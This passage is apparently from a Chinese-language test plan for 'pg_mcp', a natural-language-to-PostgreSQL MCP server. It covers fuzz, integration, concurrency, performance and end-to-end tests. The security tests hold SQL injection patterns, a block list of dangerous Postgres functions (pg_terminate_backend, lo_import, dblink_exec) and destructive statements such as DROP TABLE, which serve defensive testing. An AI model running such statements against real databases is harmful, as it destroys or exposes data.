            assert any(exc in type(e).__name__ for exc in allowed_exceptions), \
                f"Unexpected exception type: {type(e).__name__}: {e}"

    @given(st.from_regex(r"SELECT .{0,100} FROM .{1,50}", fullmatch=True))
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
    def test_select_like_patterns(self, parser: SQLParser, sql: str):
        """测试类 SELECT 模式的处理"""
        result = parser.validate(sql)
        # 不应该崩溃，结果应该是有效的
        assert result is not None
        assert isinstance(result.is_valid, bool)

    @given(st.text(alphabet=st.characters(
        whitelist_categories=('Lu', 'Ll', 'Nd', 'Pc', 'Pd'),
        whitelist_characters=" (),;'\"*="
    ), min_size=5, max_size=200))
    @settings(max_examples=300, suppress_health_check=[HealthCheck.too_slow])
    def test_sql_like_characters(self, parser: SQLParser, sql: str):
        """测试 SQL 常见字符组合"""
        result = parser.validate(sql)
        assert result is not None

    @pytest.mark.parametrize("dangerous_pattern", [
        # SQL 注入常见模式
        lambda: st.from_regex(r".*'.*OR.*'.*=.*'.*", fullmatch=True),
        lambda: st.from_regex(r".*;.*DROP.*", fullmatch=True),
        lambda: st.from_regex(r".*UNION.*SELECT.*", fullmatch=True),
    ])
    @given(data=st.data())
    @settings(max_examples=50, suppress_health_check=[HealthCheck.too_slow])
    def test_dangerous_patterns_detected(self, parser: SQLParser, data, dangerous_pattern):
        """测试危险模式被检测"""
        sql = data.draw(dangerous_pattern())
        result = parser.validate(sql)
        # 危险模式要么语法无效，要么被标记为不安全
        if result.is_valid:
            # 如果语法有效，应该被检测为不安全（或者是误报的良性模式）
            pass  # 模糊测试不强制断言，只验证不崩溃


class TestPostgresSpecificFuzzing:
    """PostgreSQL 特定的模糊测试"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    @given(st.sampled_from([
        "pg_sleep", "pg_terminate_backend", "pg_cancel_backend",
        "lo_import", "lo_export", "dblink", "dblink_exec"
    ]))
    def test_dangerous_functions_always_blocked(self, parser: SQLParser, func_name: str):
        """测试危险函数始终被阻止"""
        sql = f"SELECT {func_name}(1)"
        result = parser.validate(sql)
        assert not result.is_safe, f"Function {func_name} should be blocked"

    @given(st.integers(min_value=1, max_value=100000))
    def test_limit_values(self, parser: SQLParser, limit_value: int):
        """测试各种 LIMIT 值"""
        sql = f"SELECT * FROM users LIMIT {limit_value}"
        result = parser.validate(sql)
        assert result.is_valid
        assert result.is_safe
```

---

## 5. 集成测试用例

### 5.1 MCP 服务器测试 (test_mcp_server.py) (H-1: 已实现)

```python
# tests/integration/test_mcp_server.py

import pytest
import pytest_asyncio
from contextlib import asynccontextmanager
from unittest.mock import AsyncMock, patch, MagicMock

from pg_mcp.server import mcp, lifespan, get_context, query, list_databases, get_schema
from pg_mcp.config.models import AppConfig, DatabaseConfig, OpenAIConfig, ServerConfig, SSLMode
from pg_mcp.infrastructure.database import DatabasePoolManager
from pg_mcp.infrastructure.schema_cache import SchemaCacheManager
from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.services.query_service import QueryService
from pg_mcp.models.errors import UnknownDatabaseError, UnsafeSQLError


@asynccontextmanager
async def mock_app_context(test_database, test_config):
    """创建 Mock 应用上下文用于测试"""
    pool_manager = DatabasePoolManager()
    pool_manager._pools["test_db"] = test_database

    schema_manager = SchemaCacheManager(pool_manager)
    await schema_manager.initialize()

    sql_parser = SQLParser()

    openai_client = MagicMock()
    openai_client.generate_sql = AsyncMock()

    query_service = QueryService(
        config=test_config.server,
        pool_manager=pool_manager,
        schema_manager=schema_manager,
        sql_parser=sql_parser,
        openai_client=openai_client
    )

    # 模拟 AppContext
    from dataclasses import dataclass

    @dataclass
    class MockAppContext:
        pool_manager: DatabasePoolManager
        schema_manager: SchemaCacheManager
        query_service: QueryService

    context = MockAppContext(
        pool_manager=pool_manager,
        schema_manager=schema_manager,
        query_service=query_service
    )

    # Patch get_context
    with patch('pg_mcp.server.get_context', return_value=context):
        yield context

    await schema_manager.close()


class TestMCPResources:
    """MCP Resources 测试 (H-1: 已实现)"""

    @pytest.mark.asyncio
    async def test_list_databases_resource(self, test_database, test_config):
        """测试数据库列表资源"""
        async with mock_app_context(test_database, test_config) as ctx:
            result = await list_databases()

            assert "Available Databases:" in result
            assert "test_db" in result
            assert "tables" in result.lower() or "views" in result.lower()

    @pytest.mark.asyncio
    async def test_get_schema_resource(self, test_database, test_config):
        """测试 Schema 资源"""
        async with mock_app_context(test_database, test_config) as ctx:
            result = await get_schema("test_db")

            assert "users" in result.lower()
            assert "orders" in result.lower()
            assert "id" in result.lower()

    @pytest.mark.asyncio
    async def test_get_schema_unknown_database(self, test_database, test_config):
        """测试获取未知数据库 Schema"""
        async with mock_app_context(test_database, test_config) as ctx:
            result = await get_schema("nonexistent_db")

            assert "Error" in result or "not found" in result.lower()


class TestMCPTools:
    """MCP Tools 测试 (H-1: 已实现)"""

    @pytest.mark.asyncio
    async def test_query_tool_success(self, test_database, test_config):
        """测试查询工具成功执行"""
        async with mock_app_context(test_database, test_config) as ctx:
            # Mock OpenAI 返回有效 SQL
            ctx.query_service._openai.generate_sql.return_value = MagicMock(
                sql="SELECT id, name FROM users",
                tokens_used=50
            )

            result = await query(
                question="Show all users",
                database="test_db",
                return_type="result"
            )

            assert result["success"] is True
            assert result["result"] is not None
            assert len(result["result"]["rows"]) > 0

    @pytest.mark.asyncio
    async def test_query_tool_returns_sql(self, test_database, test_config):
        """测试查询工具返回 SQL"""
        async with mock_app_context(test_database, test_config) as ctx:
            ctx.query_service._openai.generate_sql.return_value = MagicMock(
                sql="SELECT * FROM users WHERE status = 'active'",
                tokens_used=50
            )

            result = await query(
                question="Show active users",
                database="test_db",
                return_type="sql"
            )

            assert result["success"] is True
            assert result["sql"] is not None
            assert "SELECT" in result["sql"]

    @pytest.mark.asyncio
    async def test_query_tool_unknown_database(self, test_database, test_config):
        """测试查询工具处理未知数据库"""
        async with mock_app_context(test_database, test_config) as ctx:
            result = await query(
                question="Show all users",
                database="nonexistent_db"
            )

            assert result["success"] is False
            assert result["error_code"] == "UNKNOWN_DATABASE"

    @pytest.mark.asyncio
    async def test_query_tool_unsafe_sql(self, test_database, test_config):
        """测试查询工具拒绝不安全 SQL"""
        async with mock_app_context(test_database, test_config) as ctx:
            # Mock OpenAI 返回不安全 SQL
            ctx.query_service._openai.generate_sql.return_value = MagicMock(
                sql="DROP TABLE users",
                tokens_used=50
            )

            result = await query(
                question="Delete all users",
                database="test_db"
            )

            assert result["success"] is False
            assert result["error_code"] == "UNSAFE_SQL"

    @pytest.mark.asyncio
    async def test_query_tool_with_limit(self, test_database, test_config):
        """测试查询工具带 LIMIT"""
        async with mock_app_context(test_database, test_config) as ctx:
            ctx.query_service._openai.generate_sql.return_value = MagicMock(
                sql="SELECT * FROM users",
                tokens_used=50
            )

            result = await query(
                question="Show users",
                database="test_db",
                limit=1
            )

            assert result["success"] is True
            assert len(result["result"]["rows"]) <= 1

    @pytest.mark.asyncio
    async def test_query_tool_both_return_type(self, test_database, test_config):
        """测试查询工具返回 SQL 和结果"""
        async with mock_app_context(test_database, test_config) as ctx:
            ctx.query_service._openai.generate_sql.return_value = MagicMock(
                sql="SELECT id, name FROM users LIMIT 2",
                tokens_used=50
            )

            result = await query(
                question="Show first 2 users",
                database="test_db",
                return_type="both"
            )

            assert result["success"] is True
            assert result["sql"] is not None
            assert result["result"] is not None
```

### 5.2 查询流程测试 (test_query_flow.py)

```python
# tests/integration/test_query_flow.py

import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, patch, MagicMock

from pg_mcp.services.query_service import QueryService
from pg_mcp.models.query import QueryRequest, ReturnType
from pg_mcp.models.errors import UnsafeSQLError, QueryTimeoutError
from pg_mcp.config.models import ServerConfig, RateLimitConfig
from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.infrastructure.database import DatabasePoolManager
from pg_mcp.infrastructure.schema_cache import SchemaCacheManager


class TestQueryServiceFlow:
    """查询服务流程测试"""

    @pytest_asyncio.fixture
    async def query_service(self, test_database, test_config):
        """创建查询服务实例"""
        pool_manager = DatabasePoolManager()
        pool_manager._pools["test_db"] = test_database

        schema_manager = SchemaCacheManager(pool_manager)
        await schema_manager.initialize()

        sql_parser = SQLParser()

        # Mock OpenAI 客户端
        openai_client = MagicMock()
        openai_client.generate_sql = AsyncMock()

        service = QueryService(
            config=test_config.server,
            pool_manager=pool_manager,
            schema_manager=schema_manager,
            sql_parser=sql_parser,
            openai_client=openai_client
        )

        yield service

        await schema_manager.close()

    @pytest.mark.asyncio
    async def test_simple_query_flow(self, query_service):
        """测试简单查询流程"""
        # Mock OpenAI 返回有效 SQL
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="SELECT * FROM users",
            tokens_used=50
        )

        request = QueryRequest(
            question="Show all users",
            database="test_db",
            return_type=ReturnType.RESULT
        )

        response = await query_service.execute_query(request)

        assert response.success
        assert response.result is not None
        assert len(response.result.rows) > 0

    @pytest.mark.asyncio
    async def test_query_with_sql_return(self, query_service):
        """测试返回 SQL 的查询"""
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="SELECT * FROM users WHERE status = 'active'",
            tokens_used=50
        )

        request = QueryRequest(
            question="Show active users",
            database="test_db",
            return_type=ReturnType.SQL
        )

        response = await query_service.execute_query(request)

        assert response.success
        assert response.sql is not None
        assert "SELECT" in response.sql
        assert response.result is None

    @pytest.mark.asyncio
    async def test_query_with_both_return(self, query_service):
        """测试返回 SQL 和结果的查询"""
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="SELECT id, name FROM users LIMIT 5",
            tokens_used=50
        )

        request = QueryRequest(
            question="Show first 5 users",
            database="test_db",
            return_type=ReturnType.BOTH
        )

        response = await query_service.execute_query(request)

        assert response.success
        assert response.sql is not None
        assert response.result is not None

    @pytest.mark.asyncio
    async def test_unsafe_sql_rejected(self, query_service):
        """测试不安全 SQL 被拒绝"""
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="DELETE FROM users WHERE id = 1",
            tokens_used=50
        )

        request = QueryRequest(
            question="Delete user 1",
            database="test_db"
        )

        with pytest.raises(UnsafeSQLError):
            await query_service.execute_query(request)

    @pytest.mark.asyncio
    async def test_query_with_limit(self, query_service):
        """测试带 LIMIT 的查询"""
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="SELECT * FROM users",
            tokens_used=50
        )

        request = QueryRequest(
            question="Show users",
            database="test_db",
            limit=2
        )

        response = await query_service.execute_query(request)

        assert response.success
        assert len(response.result.rows) <= 2

    @pytest.mark.asyncio
    async def test_result_truncation(self, query_service):
        """测试结果截断"""
        query_service._openai.generate_sql.return_value = MagicMock(
            sql="SELECT * FROM users",
            tokens_used=50
        )

        request = QueryRequest(
            question="Show all users",
            database="test_db",
            limit=1
        )

        response = await query_service.execute_query(request)

        # 如果实际数据超过 limit，应该标记为截断
        if response.result.row_count == 1:
            # 可能被截断
            pass


class TestQueryRetryMechanism:
    """查询重试机制测试"""

    @pytest.mark.asyncio
    async def test_retry_on_syntax_error(self, query_service):
        """测试语法错误时重试"""
        # 第一次返回无效 SQL，第二次返回有效 SQL
        query_service._openai.generate_sql.side_effect = [
            MagicMock(sql="SELEC * FROM users", tokens_used=50),  # 语法错误
            MagicMock(sql="SELECT * FROM users", tokens_used=50),  # 正确
        ]

        request = QueryRequest(
            question="Show users",
            database="test_db"
        )

        response = await query_service.execute_query(request)

        assert response.success
        assert query_service._openai.generate_sql.call_count == 2
```

### 5.3 并发测试 (test_concurrency.py) (H-2)

```python
# tests/integration/test_concurrency.py

import pytest
import pytest_asyncio
import asyncio

from pg_mcp.infrastructure.database import DatabasePool
from pg_mcp.infrastructure.schema_cache import SchemaCache
from pg_mcp.infrastructure.rate_limiter import RateLimiter, RateLimitExceededError
from pg_mcp.config.models import RateLimitConfig


class TestConcurrentDatabaseAccess:
    """并发数据库访问测试 (H-2)"""

    @pytest.mark.asyncio
    async def test_concurrent_pool_acquire(self, test_database: DatabasePool):
        """测试并发获取连接不超过池限制"""
        results = []

        async def acquire_and_query():
            async with test_database.acquire() as conn:
                # 模拟查询耗时
                await conn.fetch("SELECT pg_sleep(0.1)")
                results.append(True)

        # 并发获取 20 个连接 (超过 max_pool_size=5)
        tasks = [acquire_and_query() for _ in range(20)]
        await asyncio.gather(*tasks)

        # 所有任务应该成功完成（连接池会排队等待）
        assert len(results) == 20

    @pytest.mark.asyncio
    async def test_concurrent_queries_no_deadlock(self, test_database: DatabasePool):
        """测试并发查询不会死锁"""
        async def run_query(query_id: int):
            async with test_database.acquire() as conn:
                rows = await conn.fetch(f"SELECT {query_id} as id, * FROM users")
                return len(rows)

        # 启动多个并发查询
        tasks = [run_query(i) for i in range(50)]
        results = await asyncio.gather(*tasks)

        # 所有查询应该返回相同行数
        assert all(r == results[0] for r in results)

    @pytest.mark.asyncio
    async def test_concurrent_readonly_transactions(self, test_database: DatabasePool):
        """测试并发只读事务"""
        async def readonly_query():
            async with test_database.acquire() as conn:
                async with conn.transaction(readonly=True):
                    return await conn.fetch("SELECT COUNT(*) FROM users")

        tasks = [readonly_query() for _ in range(30)]
        results = await asyncio.gather(*tasks)

        # 所有事务应该成功
        assert len(results) == 30


class TestConcurrentSchemaRefresh:
    """并发 Schema 刷新测试 (H-2)"""

    @pytest.mark.asyncio
    async def test_concurrent_schema_refresh_atomicity(self, test_database: DatabasePool):
        """测试并发刷新 Schema 保持原子性"""
        cache = SchemaCache("test_db", test_database)
        await cache.load()

        # 并发刷新
        tasks = [cache.refresh() for _ in range(10)]
        schemas = await asyncio.gather(*tasks)

        # 所有结果应该是有效的 Schema
        for schema in schemas:
            assert schema is not None
            assert len(schema.tables) > 0
            assert schema.cached_at is not None

    @pytest.mark.asyncio
    async def test_schema_access_during_refresh(self, test_database: DatabasePool):
        """测试刷新期间访问 Schema 不会失败"""
        cache = SchemaCache("test_db", test_database)
        await cache.load()

        async def refresh_loop():
            for _ in range(5):
                await cache.refresh()
                await asyncio.sleep(0.01)

        async def read_loop():
            results = []
            for _ in range(50):
                schema = await cache.get()
                results.append(schema is not None)
                await asyncio.sleep(0.005)
            return results

        # 同时进行刷新和读取
        _, read_results = await asyncio.gather(refresh_loop(), read_loop())

        # 所有读取都应该成功
        assert all(read_results)


class TestConcurrentRateLimiting:
    """并发速率限制测试 (H-2)"""

    @pytest.mark.asyncio
    async def test_rate_limiter_concurrent_accuracy(self):
        """测试速率限制器并发计数准确"""
        config = RateLimitConfig(
            enabled=True,
            requests_per_minute=10,
            requests_per_hour=1000,
            openai_tokens_per_minute=100000
        )
        limiter = RateLimiter(config)

        async def check_limit():
            try:
                await limiter.check_request_limit()
                return True
            except RateLimitExceededError:
                return False

        # 并发发送 20 个请求
        tasks = [check_limit() for _ in range(20)]
        results = await asyncio.gather(*tasks)

        # 正好 10 个应该成功
        assert sum(results) == 10

    @pytest.mark.asyncio
    async def test_rate_limiter_window_sliding(self):
        """测试滑动窗口正确工作"""
        config = RateLimitConfig(
            enabled=True,
            requests_per_minute=5,
            requests_per_hour=1000,
            openai_tokens_per_minute=100000
        )
        limiter = RateLimiter(config)

        # 用完配额
        for _ in range(5):
            await limiter.check_request_limit()

        # 第 6 个应该失败
        with pytest.raises(RateLimitExceededError):
            await limiter.check_request_limit()

        # 等待一小段时间（不足以重置窗口）
        await asyncio.sleep(0.1)

        # 仍然应该失败
        with pytest.raises(RateLimitExceededError):
            await limiter.check_request_limit()
```

---

## 6. 性能测试用例 (H-3)

### 6.1 性能基准测试 (test_performance.py)

```python
# tests/performance/test_performance.py

import pytest
import pytest_asyncio
import asyncio
import time
import statistics
from typing import List

from pg_mcp.infrastructure.database import DatabasePool
from pg_mcp.infrastructure.schema_cache import SchemaCache
from pg_mcp.infrastructure.sql_parser import SQLParser


class TestQueryPerformance:
    """查询性能测试 (H-3)"""

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_simple_query_latency(self, test_database: DatabasePool):
        """测试简单查询延迟"""
        latencies: List[float] = []

        for _ in range(100):
            start = time.perf_counter()
            await test_database.fetch("SELECT 1")
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        p95_latency = sorted(latencies)[94]
        p99_latency = sorted(latencies)[98]

        print(f"\nSimple query latency:")
        print(f"  Average: {avg_latency*1000:.2f}ms")
        print(f"  P95: {p95_latency*1000:.2f}ms")
        print(f"  P99: {p99_latency*1000:.2f}ms")

        # 断言性能基准
        assert avg_latency < 0.1, f"Average latency {avg_latency*1000:.2f}ms exceeds 100ms"
        assert p99_latency < 0.5, f"P99 latency {p99_latency*1000:.2f}ms exceeds 500ms"

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_complex_query_latency(self, test_database: DatabasePool):
        """测试复杂查询延迟"""
        latencies: List[float] = []

        complex_query = """
            SELECT u.name, COUNT(o.id) as order_count, SUM(o.amount) as total_amount
            FROM users u
            LEFT JOIN orders o ON u.id = o.user_id
            GROUP BY u.id, u.name
            ORDER BY total_amount DESC NULLS LAST
        """

        for _ in range(50):
            start = time.perf_counter()
            await test_database.fetch(complex_query)
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        p99_latency = sorted(latencies)[48]

        print(f"\nComplex query latency:")
        print(f"  Average: {avg_latency*1000:.2f}ms")
        print(f"  P99: {p99_latency*1000:.2f}ms")

        assert avg_latency < 0.5, f"Average latency {avg_latency*1000:.2f}ms exceeds 500ms"


class TestConnectionPoolPerformance:
    """连接池性能测试 (H-3)"""

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_connection_acquire_latency(self, test_database: DatabasePool):
        """测试连接获取延迟"""
        latencies: List[float] = []

        for _ in range(100):
            start = time.perf_counter()
            async with test_database.acquire() as conn:
                pass  # 只测量获取连接的时间
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        print(f"\nConnection acquire latency: {avg_latency*1000:.2f}ms avg")

        assert avg_latency < 0.05, f"Connection acquire too slow: {avg_latency*1000:.2f}ms"

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_pool_under_load(self, test_database: DatabasePool):
        """测试连接池在负载下的表现"""
        async def run_query():
            async with test_database.acquire() as conn:
                return await conn.fetch("SELECT pg_sleep(0.01)")

        start = time.perf_counter()
        tasks = [run_query() for _ in range(100)]
        await asyncio.gather(*tasks)
        total_time = time.perf_counter() - start

        throughput = 100 / total_time
        print(f"\nPool throughput: {throughput:.1f} queries/second")

        # 100 个查询应该在合理时间内完成
        assert total_time < 30, f"Pool under load too slow: {total_time:.1f}s"


class TestSchemaCachePerformance:
    """Schema 缓存性能测试 (H-3)"""

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_schema_load_time(self, test_database: DatabasePool):
        """测试 Schema 加载时间"""
        cache = SchemaCache("test_db", test_database)

        start = time.perf_counter()
        schema = await cache.load()
        load_time = time.perf_counter() - start

        print(f"\nSchema load time: {load_time*1000:.2f}ms")
        print(f"  Tables: {len(schema.tables)}")
        print(f"  Views: {len(schema.views)}")

        assert load_time < 5.0, f"Schema load too slow: {load_time:.2f}s"

    @pytest.mark.slow
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_schema_refresh_time(self, test_database: DatabasePool):
        """测试 Schema 刷新时间"""
        cache = SchemaCache("test_db", test_database)
        await cache.load()

        refresh_times: List[float] = []
        for _ in range(10):
            start = time.perf_counter()
            await cache.refresh()
            refresh_times.append(time.perf_counter() - start)

        avg_refresh = statistics.mean(refresh_times)
        print(f"\nSchema refresh time: {avg_refresh*1000:.2f}ms avg")

        assert avg_refresh < 5.0, f"Schema refresh too slow: {avg_refresh:.2f}s"

    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_schema_cache_hit_latency(self, test_database: DatabasePool):
        """测试 Schema 缓存命中延迟"""
        cache = SchemaCache("test_db", test_database)
        await cache.load()

        latencies: List[float] = []
        for _ in range(1000):
            start = time.perf_counter()
            await cache.get()
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        print(f"\nSchema cache hit latency: {avg_latency*1000000:.2f}us avg")

        # 缓存命中应该非常快（微秒级）
        assert avg_latency < 0.001, f"Cache hit too slow: {avg_latency*1000:.2f}ms"


class TestSQLParserPerformance:
    """SQL 解析器性能测试 (H-3)"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    @pytest.mark.performance
    def test_simple_sql_parse_time(self, parser: SQLParser):
        """测试简单 SQL 解析时间"""
        sql = "SELECT * FROM users WHERE id = 1"

        latencies: List[float] = []
        for _ in range(1000):
            start = time.perf_counter()
            parser.validate(sql)
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        print(f"\nSimple SQL parse time: {avg_latency*1000:.3f}ms avg")

        assert avg_latency < 0.01, f"SQL parse too slow: {avg_latency*1000:.2f}ms"

    @pytest.mark.performance
    def test_complex_sql_parse_time(self, parser: SQLParser):
        """测试复杂 SQL 解析时间"""
        sql = """
            WITH active_users AS (
                SELECT * FROM users WHERE status = 'active'
            ),
            user_orders AS (
                SELECT user_id, COUNT(*) as order_count, SUM(amount) as total
                FROM orders
                GROUP BY user_id
            )
            SELECT au.name, uo.order_count, uo.total
            FROM active_users au
            LEFT JOIN user_orders uo ON au.id = uo.user_id
            WHERE uo.total > 100
            ORDER BY uo.total DESC
            LIMIT 10
        """

        latencies: List[float] = []
        for _ in range(500):
            start = time.perf_counter()
            parser.validate(sql)
            latencies.append(time.perf_counter() - start)

        avg_latency = statistics.mean(latencies)
        p99_latency = sorted(latencies)[494]
        print(f"\nComplex SQL parse time:")
        print(f"  Average: {avg_latency*1000:.3f}ms")
        print(f"  P99: {p99_latency*1000:.3f}ms")

        assert avg_latency < 0.05, f"Complex SQL parse too slow: {avg_latency*1000:.2f}ms"
```

---

## 7. 端到端测试用例

### 6.1 完整流程测试 (test_full_flow.py)

```python
# tests/e2e/test_full_flow.py

import pytest
import pytest_asyncio
from testcontainers.postgres import PostgresContainer
from unittest.mock import AsyncMock, MagicMock

from pg_mcp.config.models import (
    AppConfig, DatabaseConfig, OpenAIConfig,
    ServerConfig, SSLMode
)
from pg_mcp.infrastructure.database import DatabasePoolManager
from pg_mcp.infrastructure.schema_cache import SchemaCacheManager
from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.services.query_service import QueryService
from pg_mcp.models.query import QueryRequest, ReturnType


class TestEndToEndFlow:
    """端到端流程测试 - 使用真实 PostgreSQL"""

    @pytest.fixture(scope="class")
    def postgres(self):
        """启动 PostgreSQL 容器"""
        with PostgresContainer("postgres:16-alpine") as container:
            yield container

    @pytest_asyncio.fixture
    async def setup_environment(self, postgres):
        """设置完整测试环境"""
        # 创建配置
        config = AppConfig(
            databases=[
                DatabaseConfig(
                    name="e2e_test",
                    connection_string=postgres.get_connection_url(),
                    ssl_mode=SSLMode.DISABLE,
                )
            ],
            openai=OpenAIConfig(api_key="test-key"),
            server=ServerConfig()
        )

        # 初始化组件
        pool_manager = DatabasePoolManager()
        for db_config in config.databases:
            pool_manager.add_database(db_config)
        await pool_manager.initialize_all()

        # 创建测试数据
        pool = pool_manager.get_pool("e2e_test")
        async with pool.acquire() as conn:
            await conn.execute("""
                DROP TABLE IF EXISTS products CASCADE;
                DROP TABLE IF EXISTS categories CASCADE;

                CREATE TABLE categories (
                    id SERIAL PRIMARY KEY,
                    name VARCHAR(100) NOT NULL
                );

                CREATE TABLE products (
                    id SERIAL PRIMARY KEY,
                    name VARCHAR(200) NOT NULL,
                    price DECIMAL(10, 2) NOT NULL,
                    category_id INTEGER REFERENCES categories(id),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );

                INSERT INTO categories (name) VALUES ('Electronics'), ('Books'), ('Clothing');
                INSERT INTO products (name, price, category_id) VALUES
                    ('Laptop', 999.99, 1),
                    ('Phone', 599.99, 1),
                    ('Python Book', 49.99, 2),
                    ('T-Shirt', 19.99, 3);
            """)

        # 初始化 Schema 缓存
        schema_manager = SchemaCacheManager(pool_manager)
        await schema_manager.initialize()

        # 创建查询服务
        sql_parser = SQLParser()
        openai_client = MagicMock()

        query_service = QueryService(
            config=config.server,
            pool_manager=pool_manager,
            schema_manager=schema_manager,
            sql_parser=sql_parser,
            openai_client=openai_client
        )

        yield {
            "config": config,
            "pool_manager": pool_manager,
            "schema_manager": schema_manager,
            "query_service": query_service,
            "openai_client": openai_client
        }

        # 清理
        await schema_manager.close()
        await pool_manager.close_all()

    @pytest.mark.asyncio
    async def test_complete_query_flow(self, setup_environment):
        """测试完整查询流程"""
        env = setup_environment

        # Mock OpenAI 返回
        env["openai_client"].generate_sql = AsyncMock(return_value=MagicMock(
            sql="SELECT p.name, p.price, c.name as category FROM products p JOIN categories c ON p.category_id = c.id ORDER BY p.price DESC",
            tokens_used=100
        ))

        request = QueryRequest(
            question="Show all products with their categories, ordered by price",
            database="e2e_test",
            return_type=ReturnType.BOTH
        )

        response = await env["query_service"].execute_query(request)

        assert response.success
        assert response.sql is not None
        assert response.result is not None
        assert len(response.result.rows) == 4
        assert "Laptop" in str(response.result.rows[0])

    @pytest.mark.asyncio
    async def test_aggregation_query(self, setup_environment):
        """测试聚合查询"""
        env = setup_environment

        env["openai_client"].generate_sql = AsyncMock(return_value=MagicMock(
            sql="SELECT c.name, COUNT(p.id) as product_count, AVG(p.price) as avg_price FROM categories c LEFT JOIN products p ON c.id = p.category_id GROUP BY c.name",
            tokens_used=100
        ))

        request = QueryRequest(
            question="Show product count and average price per category",
            database="e2e_test"
        )

        response = await env["query_service"].execute_query(request)

        assert response.success
        assert len(response.result.columns) == 3
        assert "product_count" in response.result.columns

    @pytest.mark.asyncio
    async def test_security_in_production_like_environment(self, setup_environment):
        """测试生产环境类似配置的安全性"""
        env = setup_environment

        # 尝试通过 OpenAI 返回恶意 SQL
        malicious_sqls = [
            "DROP TABLE products",
            "DELETE FROM products",
            "UPDATE products SET price = 0",
            "INSERT INTO products (name, price) VALUES ('hacked', 0)",
        ]

        for malicious_sql in malicious_sqls:
            env["openai_client"].generate_sql = AsyncMock(return_value=MagicMock(
                sql=malicious_sql,
                tokens_used=50
            ))

            request = QueryRequest(
                question="test",
                database="e2e_test"
            )

            with pytest.raises(Exception):
                await env["query_service"].execute_query(request)

        # 验证数据未被修改
        pool = env["pool_manager"].get_pool("e2e_test")
        rows = await pool.fetch("SELECT COUNT(*) as count FROM products")
        assert rows[0]["count"] == 4  # 原始数据量
```

---

## 7. 测试验证清单

### 7.1 单元测试验证

```bash
# 运行单元测试并检查覆盖率
uv run pytest tests/unit/ -v --cov=src/pg_mcp --cov-report=term-missing

# 预期输出:
# - 所有测试通过
# - sql_parser 覆盖率 >= 95%
# - config 覆盖率 >= 90%
# - database 覆盖率 >= 90%
```

### 7.2 安全测试验证

```bash
# 运行安全测试
uv run pytest tests/security/ -v

# 预期输出:
# - 所有 SQL 注入测试通过
# - 所有只读事务测试通过
# - 所有深度防御测试通过
# - 100% 测试通过率
```

### 7.3 集成测试验证

```bash
# 运行集成测试 (需要 Docker)
uv run pytest tests/integration/ -v

# 预期输出:
# - MCP 服务器正常启动和关闭
# - 查询流程完整执行
# - 错误处理正确
```

### 7.4 端到端测试验证

```bash
# 运行端到端测试 (需要 Docker)
uv run pytest tests/e2e/ -v

# 预期输出:
# - 使用真实 PostgreSQL 完成完整流程
# - 安全机制在真实环境中有效
```

### 7.5 完整测试套件验证

```bash
# 运行完整测试套件
uv run pytest --cov=src/pg_mcp --cov-report=html --cov-report=term

# 检查覆盖率报告
open htmlcov/index.html

# 预期:
# - 总体覆盖率 >= 85%
# - 所有关键路径覆盖
# - 无未处理的边界情况
```

---

## 8. 持续集成配置

### 8.1 GitHub Actions 配置

```yaml
# .github/workflows/test.yml

name: Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v4

      - name: Install uv
        uses: astral-sh/setup-uv@v3
        with:
          version: "latest"

      - name: Set up Python
        run: uv python install 3.13

      - name: Install dependencies
        run: uv sync --all-extras

      - name: Run linting
        run: uv run ruff check .

      - name: Run type checking
        run: uv run mypy src/

      - name: Run unit tests
        run: uv run pytest tests/unit/ -v --cov=src/pg_mcp --cov-report=xml

      - name: Run security tests
        run: uv run pytest tests/security/ -v

      - name: Run integration tests
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
        run: uv run pytest tests/integration/ -v

      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          files: ./coverage.xml
          fail_ci_if_error: true
```

---

## 9. 修订历史

| 版本 | 日期 | 修改内容 | 作者 |
|------|------|---------|------|
| 1.0 | 2026-01-11 | 初始测试计划 | Claude |

---

## 10. 附录

### 10.1 测试数据工厂 (L-4)

```python
# tests/fixtures/factories.py

from typing import Optional
from faker import Faker
from datetime import datetime, timedelta
import random

fake = Faker()


class UserFactory:
    """用户测试数据工厂 (L-4)"""

    @staticmethod
    def create(
        name: Optional[str] = None,
        email: Optional[str] = None,
        status: str = "active"
    ) -> dict:
        """创建用户数据"""
        return {
            "name": name or fake.name(),
            "email": email or fake.unique.email(),
            "status": status,
            "created_at": fake.date_time_between(start_date="-1y", end_date="now")
        }

    @staticmethod
    def create_batch(count: int, **kwargs) -> list[dict]:
        """批量创建用户数据"""
        return [UserFactory.create(**kwargs) for _ in range(count)]


class OrderFactory:
